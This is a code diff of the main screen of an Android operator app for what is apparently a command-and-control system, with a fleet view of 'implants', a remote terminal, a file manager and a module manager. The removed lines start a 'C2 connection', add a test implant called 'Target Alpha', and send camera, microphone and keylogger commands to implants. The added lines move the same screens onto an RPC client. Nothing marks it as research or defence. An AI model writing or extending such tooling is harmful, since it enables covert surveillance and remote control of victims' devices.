@@ -4,140 +4,66 @@ import android.os.Bundle
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
 import androidx.compose.foundation.layout.fillMaxSize
-import androidx.compose.material3.MaterialTheme
 import androidx.compose.material3.Surface
-import androidx.compose.runtime.*
 import androidx.compose.ui.Modifier
 import androidx.navigation.compose.NavHost
 import androidx.navigation.compose.composable
 import androidx.navigation.compose.rememberNavController
-import com.shadow.operator.data.*
+import com.shadow.operator.data.ClientConfig
+import com.shadow.operator.data.RpcClient
 import com.shadow.operator.ui.fleet.FleetScreen
-import com.shadow.operator.ui.client.ClientControlScreen
 import com.shadow.operator.ui.terminal.TerminalScreen
 import com.shadow.operator.ui.filemanager.FileManagerScreen
 import com.shadow.operator.ui.modules.ModuleManagerScreen
-import kotlinx.coroutines.CoroutineScope
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.SupervisorJob
-import kotlinx.coroutines.launch
+import com.shadow.operator.ui.theme.ShadowTheme
 
 class MainActivity : ComponentActivity() {
-    private lateinit var database: AppDatabase
-    private lateinit var configManager: ConfigManager
-    private lateinit var repository: Repository
-    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())
+    lateinit var rpcClient: RpcClient
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        
-        database = AppDatabase.getInstance(applicationContext)
-        configManager = ConfigManager(applicationContext)
-        
-        repository = Repository(
-            dao = database.implantDao(),
-            historyDao = database.commandHistoryDao(),
-            moduleDao = database.moduleRegistryDao(),
-            mediaDao = database.mediaRecordingDao(),
-            configManager = configManager,
-            scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-        )
 
-        // Start C2 connection
-        scope.launch {
-            val config = configManager.getConfig()
-            repository.initializeNetwork(config)
-            
-            // Auto-inject test implant for verification
-            repository.addOrUpdateImplant(com.shadow.operator.data.ImplantEntity(
-                implantId = "f673be59-23e5-42c8-bbb7-356e30d37c68",
-                nickname = "Target Alpha",
-                model = "Test Device",
-                isOnline = true,
-                batteryLevel = 100,
-                rootStatus = 0,
-                shizukuStatus = true,
-                installedModules = "fs,shell"
-            ))
-        }
+        val config = ClientConfig()
+        rpcClient = RpcClient(config)
 
         setContent {
-            MaterialTheme(colorScheme = androidx.compose.material3.darkColorScheme()) {
+            ShadowTheme {
                 Surface(modifier = Modifier.fillMaxSize()) {
-                    ShadowApp(repository)
+                    ShadowApp(rpcClient)
                 }
             }
         }
     }
-
-    override fun onDestroy() {
-        super.onDestroy()
-        repository.shutdown()
-    }
 }
 
 @Composable
-fun ShadowApp(repository: Repository) {
+fun ShadowApp(rpc: RpcClient) {
     val navController = rememberNavController()
-    val implants by repository.allImplants.collectAsState()
-    val connectionState by repository.connectionState.collectAsState()
 
     NavHost(navController = navController, startDestination = "fleet") {
         composable("fleet") {
             FleetScreen(
-                implants = implants,
-                connectionState = connectionState.name,
-                onImplantSelect = { navController.navigate("client/${it.implantId}") },
-                onAddImplantClick = { /* Open setup wizard */ }
+                rpc = rpc,
+                onImplantSelect = { navController.navigate("terminal") },
+                onFileManager = { navController.navigate("files") },
+                onModules = { navController.navigate("modules") }
             )
         }
-        
-        composable("client/{id}") { backStackEntry ->
-            val id = backStackEntry.arguments?.getString("id") ?: return@composable
-            val implant = implants.find { it.implantId == id } ?: return@composable
-            
-            ClientControlScreen(
-                implant = implant,
-                onNavigateBack = { navController.popBackStack() },
-                onActionSelected = { action ->
-                    when (action) {
-                        "SHELL" -> navController.navigate("terminal/$id")
-                        "FILE_MANAGER" -> navController.navigate("fs/$id")
-                        "MODULES" -> navController.navigate("modules/$id")
-                        else -> {
-                            // Instant actions (Cam, Mic, Keylog)
-                            try {
-                                repository.sendCommand(id, com.shadow.operator.data.Command.CommandType.valueOf(action), "{}")
-                            } catch (e: IllegalArgumentException) {
-                                // Fallback to raw string if enum is missing
-                                repository.sendCommandRaw(id, action.lowercase(), "{}")
-                            }
-                        }
-                    }
-                }
-            )
-        }
-
-        composable("terminal/{id}") { backStackEntry ->
+        composable("terminal") {
             TerminalScreen(
-                implantId = backStackEntry.arguments?.getString("id")!!,
-                repository = repository,
+                rpc = rpc,
                 onNavigateBack = { navController.popBackStack() }
             )
         }
-
-        composable("fs/{id}") { backStackEntry ->
+        composable("files") {
             FileManagerScreen(
-                implantId = backStackEntry.arguments?.getString("id")!!,
-                repository = repository,
+                rpc = rpc,
                 onNavigateBack = { navController.popBackStack() }
             )
         }
-
-        composable("modules/{id}") { backStackEntry ->
+        composable("modules") {
             ModuleManagerScreen(
-                implantId = backStackEntry.arguments?.getString("id")!!,
-                repository = repository,
+                rpc = rpc,
                 onNavigateBack = { navController.popBackStack() }
             )
         }
